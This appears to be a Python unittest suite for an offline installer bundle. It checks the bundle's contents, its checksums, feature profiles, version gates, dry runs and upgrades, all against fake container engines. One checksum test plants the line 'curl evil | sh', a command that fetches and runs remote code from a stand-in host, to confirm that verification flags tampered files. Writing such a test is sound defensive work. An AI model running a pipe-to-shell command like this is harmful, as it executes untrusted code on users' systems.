"""
deploy/scripts/make-installer.sh and installer.sh: the offline bundle and the
installer's commands, against fake docker, podman and curl (support.py,
fake_engine.py, fake_curl.py). A small git history stands for the releases:
v5.2.0 tagged, then this release, 9.9.9.
"""
from __future__ import annotations

import hashlib
import json
import re
import os
import shutil
import signal
import sqlite3
import subprocess
import tarfile
import time
import unittest
from pathlib import Path

from support import COMPOSE, REPO, Sandbox

SERVICES = "traefik\nweb\napp\npostgres\nvalkey\ncode-intel\ncpu-temp-exporter\nembed\n"
EMBED = "embed/nomic-embed-text-v1.5.f16.gguf"
THIRD_PARTY = ["traefik:v3.6.7", "pgvector/pgvector:0.8.0-pg16", "public.ecr.aws/valkey/valkey:8.1-alpine", "python:3.13-slim",
               "ghcr.io/ggml-org/llama.cpp:server-cuda"]
# What compose names with make-installer's release.yml on top: the release's own by version.
IMAGES_NEW = "\n".join(THIRD_PARTY + ["arena-web:9.9.9", "arena-app:9.9.9", "arena-code-intel:9.9.9"])
# 5.2.0's compose file: one more key it needs, a file this release drops, one this release changes.
# A GPU service (llamacpp), which this host leaves out (FAKE_SERVICES has it not).
COMPOSE = COMPOSE.replace("volumes:\n", "  llamacpp:\n    image: ghcr.io/ggml-org/llama.cpp:server-cuda\nvolumes:\n", 1)
# And one the release builds that runs only when asked for (laya).
COMPOSE = COMPOSE.replace("volumes:\n", "  laya:\n    build: ./services/laya\n    profiles: [laya]\nvolumes:\n", 1)
# The embedding server, on the CPU: it waits for its model file (FAKE_WAITS_FOR).
COMPOSE = COMPOSE.replace("volumes:\n", "  embed:\n    image: ghcr.io/ggml-org/llama.cpp:server-cuda\n    container_name: embed\nvolumes:\n", 1)
# Valkey reads a file of deploy/ as it starts.
COMPOSE = COMPOSE.replace("    container_name: valkey\n", "    container_name: valkey\n    volumes: [\"./config/valkey.conf:/etc/valkey.conf:ro\"]\n", 1)
# 5.2.0 named the code-intelligence service after a brand: argus, its service, container, image and volume.
COMPOSE_OLD = COMPOSE.replace("name: arena\n", "name: arena\n# 5.2.0\n").replace("code-intel", "argus")
COMPOSE_NEW = COMPOSE.replace("    container_name: app\n", "    container_name: app\n    environment: { NEW_KEY: \"${NEW_KEY:?set NEW_KEY}\", APP_KEY: \"${APP_KEY:?}\" }\n")
# This release's features: each optional service under its feature's profile (5.2.0 had none but Laya's).
for svc, feature, after in (("code-intel", "code-intel", "    container_name: code-intel\n"), ("cpu-temp-exporter", "monitoring", "    container_name: cpu-temp-exporter\n"),
                            ("embed", "knowledge", "    container_name: embed\n"), ("llamacpp", "chat-models", "  llamacpp:\n    image: ghcr.io/ggml-org/llama.cpp:server-cuda\n")):
    assert COMPOSE_NEW.count(after) == 1, svc
    COMPOSE_NEW = COMPOSE_NEW.replace(after, after + f"    profiles: [{feature}]\n")
FEATURES = """# id | default | services | needs | requires | title
chat-models | on  | llamacpp | gpu | - | Chat models on this host
knowledge   | on  | embed | - | - | Search by meaning
code-intel       | on  | code-intel | gitlab | - | code-intel
monitoring  | on  | cpu-temp-exporter | - | - | Monitoring
laya        | off | laya | - | - | Laya
meetings    | on  | - | - | knowledge | Meetings
"""
DEFAULT_FEATURES = "chat-models,knowledge,code-intel,monitoring,meetings"
# And its data in DATA_DIR's folders, as volumes bound there (5.2.0's were in the engine's storage).
COMPOSE_NEW = COMPOSE_NEW.replace("volumes:\n  postgres:\n  engine:\n", "volumes:\n" + "".join(
    f'  {v}:\n    driver_opts: {{ type: none, o: bind, device: "${{DATA_DIR:?set DATA_DIR}}/{v}" }}\n' for v in ("postgres", "engine")), 1)
ENV_EXAMPLE_OLD = "DOMAIN=llm.localhost\nADMIN_EMAIL=admin@example.com\nMODELS_DIR=./models\nMODEL=org/repo:Q4\nADMIN_PASSWORD=\nAPP_KEY=\nDB_PASSWORD=\nGATEWAY_KEY=\nENGINE_KEY=\nARGUS_KEY=\n"
ENV_EXAMPLE_NEW = ENV_EXAMPLE_OLD.replace("GATEWAY_KEY=\n", "").replace("ARGUS_KEY=", "CODE_INTEL_KEY=\nCODE_INTEL_HOST=code-intel") + f"COMPOSE_PROFILES={DEFAULT_FEATURES}\n# A new setting\nNEW_SETTING=on\nNEW_KEY=\nDATA_DIR=\n# HTTP_PORT=8080\n"
OLD_ENV = ("DOMAIN=old.example\nADMIN_EMAIL=me@old.example\nMODELS_DIR=./models\nMODEL=lib/model.gguf\nADMIN_PASSWORD=old-admin-pass\n"
           "APP_KEY=old-app-key\nDB_PASSWORD=old-db\nGATEWAY_KEY=sk-old\nENGINE_KEY=old-engine\nARGUS_KEY=old-argus\nOLD_THING=1\n")


def git(repo: Path, *args: str) -> None:
    subprocess.run(["git", "-c", "user.name=t", "-c", "user.email=t@t", "-C", str(repo), *args], check=True, capture_output=True)


class Release:
    """A repository with v5.2.0 tagged and 9.9.9 at HEAD, its images in a fake store, and its bundle."""

    def __init__(self, *make_args: str, services: str = SERVICES, embed_model: bool = False, tag: bool = True):
        self.s = s = Sandbox(curl=True)
        self.repo = s.repo
        s.write("docker-compose.yml", COMPOSE_OLD)
        # 5.2.0 had no list of features.
        (s.deploy / "features").unlink()
        s.write(".env.example", ENV_EXAMPLE_OLD)
        s.write("config/valkey.conf", "model_list: []\n")
        s.write("config/traefik/routes.yml", "http: {}\n")
        s.write("config/dropped.yml", "old: 1\n")
        s.write("config/edited.yml", "shipped: 1\n")
        s.write("certs/README.md", "certificates\n")
        (self.repo / "VERSION").write_text("5.2.0\n")
        git(self.repo, "init", "-q")
        git(self.repo, "add", "-A")
        git(self.repo, "commit", "-q", "-m", "5.2.0")
        if tag:
            git(self.repo, "tag", "v5.2.0")
        self.old = s.dir / "old-deploy"
        shutil.copytree(s.deploy, self.old)
        s.write("docker-compose.yml", COMPOSE_NEW)
        s.write("features", FEATURES)
        s.write(".env.example", ENV_EXAMPLE_NEW)
        (s.deploy / "config" / "dropped.yml").unlink()
        s.write("config/edited.yml", "shipped: 2\n")
        s.write("config/added.yml", "new: 1\n")
        s.write("docker-compose.override.yml", "services: {}\n")  # the packing host's: never shipped
        s.write("untracked.txt", "not in git\n")
        (self.repo / "VERSION").write_text("9.9.9\n")
        s.write("LICENSE.md", "AGPL\n", base=self.repo)
        s.write("LICENSING.md", "licensing\n", base=self.repo)
        s.write("docs/deployment.md", "# Deploying\n", base=self.repo)
        s.write("docs/plan.md", "# Plans\n", base=self.repo)
        s.write("dist/code-arena-9.9.9-linux-x64.tar.gz", "code arena\n", base=self.repo)
        # Packs: the newest of each name goes in (an older week's and a file that is no pack stay out).
        for name, version in (("python.kpack", "1.0"), ("python-2026.11.12.kpack", "2026.11.12")):
            (self.repo / "packs").mkdir(exist_ok=True)
            con = sqlite3.connect(self.repo / "packs" / name)
            con.execute("create table pack_meta (key text primary key, value text)")
            con.executemany("insert into pack_meta values (?, ?)", [("source_name", "python"), ("pack_version", version)])
            con.commit()
            con.close()
        s.write("packs/notes.kpack", "not a pack\n", base=self.repo)
        git(self.repo, "add", "-A", ":!deploy/untracked.txt", ":!deploy/docker-compose.override.yml")
        git(self.repo, "commit", "-q", "-m", "9.9.9")
        self.state = s.dir / "engine.json"
        # The third-party images, and the release's own as compose built them (latest).
        # As compose built them; the 5.2.0 installation runs arena-argus (its service was named after a brand then).
        refs = THIRD_PARTY + ["arena-app:latest", "arena-web:latest", "arena-code-intel:latest", "arena-argus:latest", "arena-laya:latest"]
        self.state.write_text(json.dumps({"images": {r: f"{i:064x}" for i, r in enumerate(refs, start=1)}}))
        # 5.2.0's compose file names the code-intelligence service argus: the fake runs it under either name.
        services = services + "argus\n" if "code-intel\n" in services else services
        s.env = {"FAKE_STATE": str(self.state), "FAKE_SERVICES": services,
                 "FAKE_COMPOSE_VOLUMES": "postgres\nengine\ncode-intel\n", "FAKE_WAITS_FOR": f"embed={EMBED}"}
        if embed_model:
            # On the packing host, in its model library (deploy/models: no .env there).
            s.write(f"models/{EMBED}", "an embedding model\n")
        self.dist = self.repo / "dist"
        self.made = s.run("make-installer.sh", *make_args)
        self.run_file = self.dist / "arena-9.9.9-offline.run"
        self.bundle = s.dir / "unpacked"

    def store(self) -> dict:
        return json.loads(self.state.read_text())

    def unpack(self) -> Path:
        """The bundle, unpacked once (sh RUN --extract)."""
        if not (self.bundle / "arena-9.9.9").is_dir():
            self.bundle.mkdir(exist_ok=True)
            r = subprocess.run(["sh", str(self.run_file), "--extract", str(self.bundle)], capture_output=True, text=True,
                               env=self.env(), timeout=120)
            assert r.returncode == 0, r.stdout + r.stderr
        return self.bundle / "arena-9.9.9"

    def env(self, extra: dict[str, str] | None = None) -> dict[str, str]:
        env = {k: v for k, v in os.environ.items() if not k.startswith(("COMPOSE_", "FAKE_"))}
        # The app's uid is the tests' own: the folders they make are theirs (uid 1001 on GitHub's runners, not 1000).
        env.update({"PATH": f"{self.s.bin}:{env.get('PATH', '/usr/bin:/bin')}", "FAKE_LOG": str(self.s.log), "TMPDIR": str(self.s.dir),
                    "XDG_RUNTIME_DIR": str(self.s.runtime), "ARENA_APP_UID": str(os.getuid())})
        env.update(self.s.env)
        env.update(extra or {})
        return env

    def run(self, *args: str, extra: dict[str, str] | None = None, via_run: bool = False) -> subprocess.CompletedProcess:
        """installer.sh ARGS, from the unpacked bundle (or the .run itself)."""
        cmd = ["sh", str(self.run_file), *args] if via_run else ["bash", str(self.unpack() / "installer.sh"), *args]
        return subprocess.run(cmd, cwd=self.s.dir, env=self.env(extra), capture_output=True, text=True, timeout=300, stdin=subprocess.DEVNULL)

    def calls(self) -> list[list[str]]:
        return self.s.calls()


class BundleTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.r = Release("--packs")

    @classmethod
    def tearDownClass(cls):
        cls.r.s.cleanup()

    def members(self, part: str) -> list[str]:
        """The names in the .run's small (head) or big (body) tar."""
        data = self.r.run_file.read_bytes()
        header = data[: data.index(b"\nHEAD_BYTES=")]
        start = int(header.split(b"HEAD_START=")[1].split()[0])
        head = int(data.split(b"\nHEAD_BYTES=")[1].split()[0])
        chunk = data[start:start + head] if part == "head" else data[start + head:]
        import io
        with tarfile.open(fileobj=io.BytesIO(chunk)) as tar:
            return tar.getnames()

    def test_A_release_is_one_file_and_its_checksum(self):
        self.assertEqual(self.r.made.returncode, 0, self.r.made.stdout + self.r.made.stderr)
        self.assertTrue(os.access(self.r.run_file, os.X_OK))
        r = subprocess.run(["sha256sum", "-c", self.r.run_file.name + ".sha256"], cwd=self.r.dist, capture_output=True, text=True)
        self.assertEqual(r.returncode, 0, r.stdout + r.stderr)
        self.assertTrue(self.r.run_file.read_bytes().startswith(b"#!/bin/sh\n"))

    def test_The_installer_and_what_it_plans_with_come_first(self):
        head = self.members("head")
        self.assertEqual(head[:3], ["arena-9.9.9/installer.sh", "arena-9.9.9/MANIFEST", "arena-9.9.9/SHA256SUMS"])
        for name in ("images/IMAGES", "images/RELEASE", "deploy/docker-compose.yml", "docs/deployment.md", "known/5.2.0.sha256", "LICENSE.md"):
            self.assertIn(f"arena-9.9.9/{name}", head)
        body = self.members("body")
        self.assertTrue(all(n.startswith("arena-9.9.9/") for n in body))
        self.assertTrue(any(n.endswith(".tar.gz") and "/images/" in n for n in body))
        self.assertFalse(set(head) & set(body))

    def test_The_bundle_holds_the_release_and_nothing_of_the_host(self):
        b = self.r.unpack()
        manifest = (b / "MANIFEST").read_text()
        for line in ("format: arena-offline 1", "version: 9.9.9", "upgrades-from: 5.2.0", "engine: docker", "packs: 1", "code-arena: 1",
                     "embedding: missing"):
            self.assertIn(line + "\n", manifest)
        self.assertRegex(manifest, r"commit: [0-9a-f]{7}")
        self.assertEqual((b / "installer.sh").read_text(), (self.r.s.deploy / "scripts" / "installer.sh").read_text())
        release = dict(line.split("\t") for line in (b / "images" / "RELEASE").read_text().splitlines())
        self.assertEqual(release, {"web": "arena-web:9.9.9", "app": "arena-app:9.9.9", "code-intel": "arena-code-intel:9.9.9", "laya": "arena-laya:9.9.9"})
        rows = [line.split("\t") for line in (b / "images" / "IMAGES").read_text().splitlines()]
        self.assertEqual(sorted(r[0] for r in rows), sorted(IMAGES_NEW.split() + ["arena-laya:9.9.9"]))
        for ref, file, _, size, raw in rows:
            self.assertTrue(file.endswith(".tar.gz"), file)
            self.assertEqual((b / "images" / file).read_bytes()[:2], b"\x1f\x8b")
            self.assertEqual(int(size), (b / "images" / file).stat().st_size)
            self.assertGreater(int(raw), 0)
        deploy = {str(p.relative_to(b / "deploy")) for p in (b / "deploy").rglob("*") if p.is_file()}
        self.assertIn("config/added.yml", deploy)
        self.assertIn("scripts/installer.sh", deploy)
        for left in (".env", "docker-compose.override.yml", "untracked.txt", "config/dropped.yml"):
            self.assertNotIn(left, deploy)
        self.assertTrue((b / "docs" / "deployment.md").is_file())
        self.assertFalse((b / "docs" / "plan.md").exists())
        self.assertTrue((b / "code-arena" / "code-arena-9.9.9-linux-x64.tar.gz").is_file())
        self.assertEqual(["python-2026.11.12.kpack"], sorted(p.name for p in (b / "packs").iterdir()))
        known = (b / "known" / "5.2.0.sha256").read_text()
        self.assertIn("  config/dropped.yml\n", known)
        self.assertIn("  docker-compose.yml\n", known)
        r = subprocess.run(["sha256sum", "-c", "--strict", "--quiet", "SHA256SUMS"], cwd=b, capture_output=True, text=True)
        self.assertEqual(r.returncode, 0, r.stdout + r.stderr)

    def test_A_bundle_without_the_embedding_model_says_so_loudly(self):
        self.assertIn(f"WARNING: {EMBED} is not in", self.r.made.stdout)
        self.assertFalse((self.r.unpack() / "models" / "library").exists())

    def test_The_version_tags_it_made_are_gone_afterwards(self):
        images = self.r.store()["images"]
        self.assertNotIn("arena-app:9.9.9", images)
        self.assertIn("arena-app:latest", images)
        self.assertFalse(any(c[1:2] == ["pull"] for c in self.r.calls()))


class ImageCacheTests(unittest.TestCase):
    """The next release's bundle from the same image cache (dist/.image-cache)."""

    def test_An_image_the_next_release_did_not_change_loads_by_its_new_name(self):
        # The cache was by the image alone, and an archive loads by the name it was saved under: a hotfix's image
        # the release before had already (the same build) went in as arena-SERVICE:OLD, and its install and upgrade
        # stopped at "arena-SERVICE:NEW is not in docker after loading it from the bundle".
        r = Release()
        try:
            (r.repo / "VERSION").write_text("9.9.10\n")
            made = r.s.run("make-installer.sh")
            self.assertEqual(made.returncode, 0, made.stdout + made.stderr)
            self.assertIn("(cached)", made.stdout, "the images the release before packed are packed once")
            out = r.s.dir / "next"
            out.mkdir()
            x = subprocess.run(["sh", str(r.dist / "arena-9.9.10-offline.run"), "--extract", str(out)], capture_output=True,
                               text=True, env=r.env(), timeout=120)
            self.assertEqual(x.returncode, 0, x.stdout + x.stderr)
            b = out / "arena-9.9.10"
            rows = [line.split("\t") for line in (b / "images" / "IMAGES").read_text().splitlines()]
            for ref, file, *_ in rows:
                with tarfile.open(b / "images" / file) as t:
                    text = t.extractfile("layer.tar").read().decode()
                self.assertEqual(text.split()[2], ref, f"{file} loads as {text.split()[2]}")
            self.assertIn("arena-app:9.9.10", [row[0] for row in rows])
        finally:
            r.s.cleanup()


class LeaveOutTests(unittest.TestCase):
    """A bundle for hosts without some services: their images stay out, Laya's (a profile of its own) too."""

    @classmethod
    def setUpClass(cls):
        # On the packing host every service is there, Laya when its profile is asked for.
        cls.r = Release("--without", "laya,chat-models,knowledge", services=SERVICES + "llamacpp\nlaya\n")

    @classmethod
    def tearDownClass(cls):
        cls.r.s.cleanup()

    def test_Left_out_services_have_no_image_in_the_bundle(self):
        self.assertEqual(self.r.made.returncode, 0, self.r.made.stdout + self.r.made.stderr)
        b = self.r.unpack()
        release = dict(line.split("\t") for line in (b / "images" / "RELEASE").read_text().splitlines())
        self.assertEqual(sorted(release), ["app", "code-intel", "web"])
        refs = [line.split("\t")[0] for line in (b / "images" / "IMAGES").read_text().splitlines()]
        self.assertFalse([ref for ref in refs if "laya" in ref or "llama.cpp" in ref], refs)
        self.assertIn("left-out: laya llamacpp embed\n", (b / "MANIFEST").read_text())
        self.assertIn("features-left-out: laya chat-models knowledge\n", (b / "MANIFEST").read_text())
        services = dict(line.split("\t") for line in (b / "images" / "SERVICES").read_text().splitlines())
        self.assertNotIn("laya", services)
        self.assertEqual("arena-code-intel:9.9.9", services["code-intel"])
        self.assertIn("embedding: left out\n", (b / "MANIFEST").read_text())

    def test_A_dry_run_finds_the_images_as_they_are_before_they_are_tagged(self):
        r = self.r.s.run("make-installer.sh", "--dry-run", "--version", "9.9.10", "--without", "laya,chat-models,knowledge")
        self.assertEqual(r.returncode, 0, r.stdout + r.stderr)
        self.assertIn("arena-app", r.stdout)
        self.assertNotIn("NOT ON THIS HOST", r.stdout)


class MakeInstallerArgumentTests(unittest.TestCase):
    def setUp(self):
        self.s = Sandbox()
        (self.s.repo / "VERSION").write_text("9.9.9\n")
        self.s.env = {"FAKE_CONFIG": COMPOSE, "FAKE_SERVICES": SERVICES}

    def tearDown(self):
        self.s.cleanup()

    def test_Arguments_are_checked(self):
        for args, message in [
            (["--fast"], "unknown option"),
            (["--version", "five"], "not a version"),
            (["--version", "5.1.0"], "older than 5.2.0"),
            (["--without", "nope"], "--without nope: no such feature"),
            (["--without", "meetings"], "--without meetings: a part of the app"),
            (["--project", "Bad Name"], "--project"),
        ]:
            r = self.s.run("make-installer.sh", *args)
            self.assertEqual(r.returncode, 2, (args, r.stdout, r.stderr))
            self.assertIn(message, r.stderr, args)

    def test_A_release_image_that_is_not_built_stops_it(self):
        state = self.s.dir / "engine.json"
        state.write_text(json.dumps({"images": {}}))
        self.s.env["FAKE_STATE"] = str(state)
        r = self.s.run("make-installer.sh")
        self.assertEqual(r.returncode, 1)
        self.assertRegex(r.stderr, r"arena-(app|web) is not on this host: build it first")
        self.assertFalse((self.s.repo / "dist").exists() and any((self.s.repo / "dist").glob("*.run")))

    def test_A_dry_run_writes_and_saves_nothing(self):
        r = self.s.run("make-installer.sh", "--dry-run", "--without", "code-intel")
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertIn("Would make", r.stdout)
        self.assertIn("features left out: code-intel (their services: code-intel)", r.stdout)
        # No git here, so no tag of 5.2.0: said in the plan, refused by the real run.
        self.assertIn("known/: NOT MADE: no git tag of 5.2.0", r.stdout)
        self.assertFalse((self.s.repo / "dist").exists())
        self.assertFalse(self.s.called("save") or self.s.called("tag"))


class SourceBundleTests(unittest.TestCase):
    """make-installer.sh --images-in-engine --stage-only: a checkout's bundle (arenactl install), its images named, not saved."""

    @classmethod
    def setUpClass(cls):
        cls.r = Release()
        cls.stage = cls.r.s.dir / "source-stage"
        cls.stage.mkdir()
        # Images built from a checkout say its version once tagged as the release's.
        cls.made = cls.r.s.run("make-installer.sh", "--images-in-engine", "--stage-only", str(cls.stage), "--no-known", extra={"FAKE_TAG_VERSION": "1"})
        cls.b = cls.stage / "arena-9.9.9"

    @classmethod
    def tearDownClass(cls):
        cls.r.s.cleanup()

    def test_It_names_the_images_without_saving_them_and_says_which_checkout_it_came_from(self):
        self.assertEqual(self.made.returncode, 0, self.made.stdout + self.made.stderr)
        rows = [line.split("\t") for line in (self.b / "images" / "IMAGES").read_text().splitlines()]
        self.assertTrue(rows)
        self.assertTrue(all(r[1] == "-" for r in rows), rows)
        self.assertEqual([p.name for p in (self.b / "images").iterdir() if p.name.endswith((".tar", ".tar.gz"))], [])
        manifest = (self.b / "MANIFEST").read_text()
        self.assertIn("images-in: engine\n", manifest)
        self.assertIn(f"source: {self.r.repo}\n", manifest)
        # Nothing of a .run: no speech models, no Code Arena packages (the app's image serves them).
        self.assertFalse((self.b / "code-arena").exists())
        self.assertFalse(list((self.b / "audio").glob("*")))
        r = subprocess.run(["bash", str(self.b / "installer.sh"), "verify"], env=self.r.env(), capture_output=True, text=True, timeout=120)
        self.assertEqual(r.returncode, 0, r.stdout + r.stderr)

    def test_It_installs_from_the_images_the_engine_has(self):
        d = self.r.s.dir / "from-source"
        r = subprocess.run(["bash", str(self.b / "installer.sh"), "install", "--dir", str(d), "--yes", "--cpu-only", "--skip-requirements",
                            "--timeout", "5s", "--domain", "arena.test", "--https-port", "18443", "--http-port", "18080"],
                           cwd=self.r.s.dir, env=self.r.env({"FAKE_TAG_VERSION": "1"}), capture_output=True, text=True, timeout=300, stdin=subprocess.DEVNULL)
        self.assertEqual(r.returncode, 0, r.stdout + r.stderr)
        self.assertIn("images (in docker already: built and pulled from", r.stdout)
        self.assertNotIn("loaded arena-", r.stdout)
        self.assertTrue((d / "deploy" / "certs" / "tls.crt").is_file())


class InstallerTests(unittest.TestCase):
    """installer.sh's commands, each test on a fresh copy of one release's bundle."""

    @classmethod
    def setUpClass(cls):
        cls.r = Release()
        cls.r.unpack()
        cls.pristine = json.loads(cls.r.state.read_text())

    @classmethod
    def tearDownClass(cls):
        cls.r.s.cleanup()

    def setUp(self):
        self.r.state.write_text(json.dumps(self.pristine))
        self.r.s.log.write_text("")
        self.dir = self.r.s.dir / f"inst-{self._testMethodName}"

    def tearDown(self):
        shutil.rmtree(self.dir, ignore_errors=True)
        shutil.rmtree(self.r.s.dir / "final", ignore_errors=True)

    # ---------------------------------------------------------------- helpers

    def install(self, *extra: str, code: int = 0, gitlab: bool = True, extra_env: dict[str, str] | None = None) -> subprocess.CompletedProcess:
        token = self.r.s.dir / "gitlab-token"
        token.write_text("glpat-a-token-for-the-test\n")
        more = ["--gitlab-url", "https://gitlab.test", "--gitlab-token-file", str(token)] if gitlab else []
        r = self.r.run("install", "--dir", str(self.dir), "--yes", "--cpu-only", "--skip-requirements", "--timeout", "5s",
                       "--domain", "arena.test", "--https-port", "18443", "--http-port", "18080", *more, *extra, extra=extra_env)
        self.assertEqual(r.returncode, code, r.stdout + r.stderr)
        return r

    def old_install(self, version_file: bool = False, running: bool = True) -> Path:
        """A 5.2.0 installation the old way (airgap.sh load, compose up): no record of this installer."""
        deploy = self.dir / "deploy"
        shutil.copytree(self.r.old, deploy)
        (deploy / ".env").write_text(OLD_ENV)
        (deploy / ".env").chmod(0o600)
        (deploy / "config" / "edited.yml").write_text("shipped: 1\nmine: yes\n")
        # Changed here, as an admin changes budgets; 9.9.9 ships it as 5.2.0 did.
        (deploy / "config" / "valkey.conf").write_text("model_list: []\nbudget: mine\n")
        (deploy / "config" / "mine.yml").write_text("my own\n")
        (deploy / "certs" / "tls.key").write_text("KEY\n")
        if version_file:
            (self.dir / "VERSION").write_text("5.2.0\n")
        if running:
            self.compose_up(deploy)
        return deploy

    def compose_up(self, deploy: Path, project: str = "arena") -> None:
        subprocess.run(["docker", "compose", "up", "-d"], cwd=deploy, env=self.r.env({"COMPOSE_PROJECT_NAME": project}), check=True)

    def output(self, r: subprocess.CompletedProcess) -> str:
        return r.stdout + r.stderr

    def logs(self) -> str:
        return "".join(p.read_text() for p in (self.dir / ".arena-install" / "logs").glob("*.log"))

    def containers(self) -> list[dict]:
        return self.r.store()["containers"]

    # ------------------------------------------------------------- arguments

    def test_Arguments_are_checked(self):
        for args, message in [
            ([], "say what to do"),
            (["setup"], "unknown command: setup"),
            (["install", "--fast"], "unknown option: --fast"),
            (["install", "--purge"], "--purge is for remove"),
            (["upgrade", "--cpu-only"], "--cpu-only is for install"),
            (["remove", "--confirm", "PURGE"], "--confirm is for --purge"),
            (["install", "--https-port", "70000"], "a port is a number"),
            (["install", "--timeout", "soon"], "--timeout is minutes"),
            (["install", "--project", "Arena"], "--project"),
            (["install", "--dir"], "--dir needs a value"),
        ]:
            r = self.r.run(*args)
            self.assertEqual(r.returncode, 2, (args, r.stdout, r.stderr))
            self.assertIn(message, r.stderr, args)
        r = self.r.run("help")
        self.assertEqual(r.returncode, 0)
        self.assertIn("Exit codes:", r.stdout)

    def test_No_questions_without_a_terminal_or_yes(self):
        r = self.r.run("install", "--dir", str(self.dir), "--cpu-only")
        self.assertEqual(r.returncode, 3, self.output(r))
        self.assertIn("no terminal to ask the domain, ports and models", r.stderr)
        self.assertFalse(self.dir.exists())

    # ------------------------------------------------------------- dry runs

    def test_A_dry_run_install_from_the_run_file_changes_nothing(self):
        r = self.r.run("install", "--dir", str(self.dir), "--yes", "--cpu-only", "--dry-run", via_run=True)
        self.assertEqual(r.returncode, 0, self.output(r))
        out = r.stdout
        self.assertIn("dry run: nothing is done", out)
        self.assertIn("the small ones: the rest is checked when it is unpacked", out)
        # No GPU and no GitLab: the chat models and code-intel are off, and so their images are not loaded.
        self.assertIn("features: 3 on, off: chat-models code-intel laya", out)
        self.assertIn("would  load the 7 images of the core and the features on", out)
        self.assertIn("would  write docker-compose.override.yml\n", out)
        self.assertIn("no GitLab given (--gitlab-url, --gitlab-token-file): code-intel is off", out)
        self.assertFalse(self.dir.exists())
        mutating = {"load", "tag", "run", "rm", "rmi", "save"}
        self.assertFalse([c for c in self.r.calls() if c[1:2] and c[1] in mutating], self.r.calls())
        self.assertFalse([c for c in self.r.calls() if c[1:2] == ["compose"] and "up" in c])
        self.assertEqual(list(self.r.dist.glob(".arena-unpack.*")), [])

    def test_A_dry_run_upgrade_lists_files_and_env_keys(self):
        self.old_install(version_file=True)
        before = self.r.store()
        r = self.r.run("upgrade", "--dir", str(self.dir), "--dry-run")
        self.assertEqual(r.returncode, 0, self.output(r))
        out = r.stdout
        self.assertIn("from 5.2.0 (" + str(self.dir / "VERSION") + ") to 9.9.9", out)
        self.assertIn("would  update docker-compose.yml", out)
        self.assertIn("would  keep config/edited.yml as it was changed here, and write 9.9.9's beside it as config/edited.yml.new-9.9.9 (it changes it too), to merge", out)
        self.assertIn("note   kept config/valkey.conf as it was changed here: 9.9.9 ships it as it was", out)
        self.assertNotIn("update config/valkey.conf", out)
        self.assertIn("would  add config/added.yml", out)
        self.assertIn("would  remove config/dropped.yml: not in 9.9.9 (it is 5.2.0's, unchanged)", out)
        self.assertIn("kept config/mine.yml: not in 9.9.9; yours", out)
        self.assertIn("would  add to .env: NEW_SETTING=on (the default)", out)
        self.assertIn("would  add to .env: NEW_KEY (a new secret, generated)", out)
        self.assertIn(".env: not read by 9.9.9, kept: GATEWAY_KEY OLD_THING", out)
        self.assertEqual(self.r.store(), before)
        self.assertFalse((self.dir / ".arena-install").exists())
        self.assertNotIn("NEW_KEY", (self.dir / "deploy" / ".env").read_text())

    # ------------------------------------------------------- the version gate

    def test_The_version_gate(self):
        deploy = self.old_install(running=False)
        for installed, code, message in [
            ("5.1.0", 3, "5.1.0 is installed"),
            ("5.2.0-rc1", 3, "this bundle upgrades 5.2.0 or newer"),
            ("10.0.0", 3, "newer than this bundle's 9.9.9"),
            ("9.9.9", 0, "nothing to upgrade"),
            ("five", 3, "is not one this installer reads"),
        ]:
            (self.dir / "VERSION").write_text(installed + "\n")
            r = self.r.run("upgrade", "--dir", str(self.dir), "--yes")
            self.assertEqual(r.returncode, code, (installed, self.output(r)))
            self.assertIn(message, self.output(r), installed)
        (self.dir / "VERSION").unlink()
        r = self.r.run("upgrade", "--dir", str(self.dir), "--yes")
        self.assertEqual(r.returncode, 3, self.output(r))
        self.assertIn("the version installed is not known", r.stderr)
        self.assertIn("Start the stack", r.stderr)
        self.assertEqual((deploy / ".env").read_text(), OLD_ENV)
        self.assertFalse(any(c[1:2] in (["load"], ["tag"]) for c in self.r.calls()))

    def test_The_version_comes_from_the_running_app_when_nothing_else_says(self):
        self.old_install()
        r = self.r.run("upgrade", "--dir", str(self.dir), "--dry-run")
        self.assertEqual(r.returncode, 0, self.output(r))
        self.assertIn("from 5.2.0 (the running app (/api/info)) to 9.9.9", r.stdout)

    # ------------------------------------------------------------- checksums

    def damaged_copy(self) -> Path:
        copy = self.r.s.dir / "damaged"
        shutil.rmtree(copy, ignore_errors=True)
        shutil.copytree(self.r.unpack(), copy)
        return copy

    def test_A_damaged_bundle_installs_nothing(self):
        copy = self.damaged_copy()
        (copy / "deploy" / "docker-compose.yml").write_text("services: { evil: { image: x } }\n")
        r = subprocess.run(["bash", str(copy / "installer.sh"), "install", "--dir", str(self.dir), "--yes", "--cpu-only", "--skip-requirements"],
                           env=self.r.env(), capture_output=True, text=True, stdin=subprocess.DEVNULL)
        self.assertEqual(r.returncode, 6, self.output(r))
        self.assertIn("CHECKSUM MISMATCH", r.stdout)
        self.assertFalse(any(c[1:2] == ["load"] for c in self.r.calls()))
        self.assertFalse((self.dir / "deploy").exists())

    def test_Verify_names_a_file_the_checksums_do_not(self):
        copy = self.damaged_copy()
        (copy / "deploy" / "extra.sh").write_text("curl evil | sh\n")
        r = subprocess.run(["bash", str(copy / "installer.sh"), "verify", "--dir", str(self.dir)], env=self.r.env(), capture_output=True, text=True)
        self.assertEqual(r.returncode, 6, self.output(r))
        self.assertIn("deploy/extra.sh", r.stdout)
        shutil.rmtree(copy)
        r = self.r.run("verify", "--dir", str(self.dir))
        self.assertEqual(r.returncode, 0, self.output(r))

    def test_A_bad_copy_of_the_run_file_is_caught(self):
        bad = self.r.s.dir / "copy"
        bad.mkdir(exist_ok=True)
        run = bad / self.r.run_file.name
        shutil.copy2(self.r.run_file, run)
        shutil.copy2(str(self.r.run_file) + ".sha256", str(run) + ".sha256")
        with open(run, "r+b") as f:
            f.seek(-100, 2)
            f.write(b"x" * 10)
        r = subprocess.run(["sh", str(run), "verify", "--dir", str(self.dir)], env=self.r.env(), capture_output=True, text=True, cwd=bad)
        self.assertEqual(r.returncode, 6, self.output(r))
        self.assertIn("is not the file that was made", r.stdout)
        shutil.rmtree(bad)

    # ---------------------------------------------------------------- install

    def test_Install_with_no_cert_leaves_traefik_its_own(self):
        self.install("--no-cert")
        self.assertFalse((self.dir / "deploy" / "certs" / "tls.crt").exists())

    def own(self, *args: str) -> subprocess.CompletedProcess:
        """The installation's own installer.sh."""
        return subprocess.run(["bash", str(self.dir / "deploy" / "scripts" / "installer.sh"), *args, "--dir", str(self.dir)], env=self.r.env(),
                              capture_output=True, text=True, timeout=300, stdin=subprocess.DEVNULL)

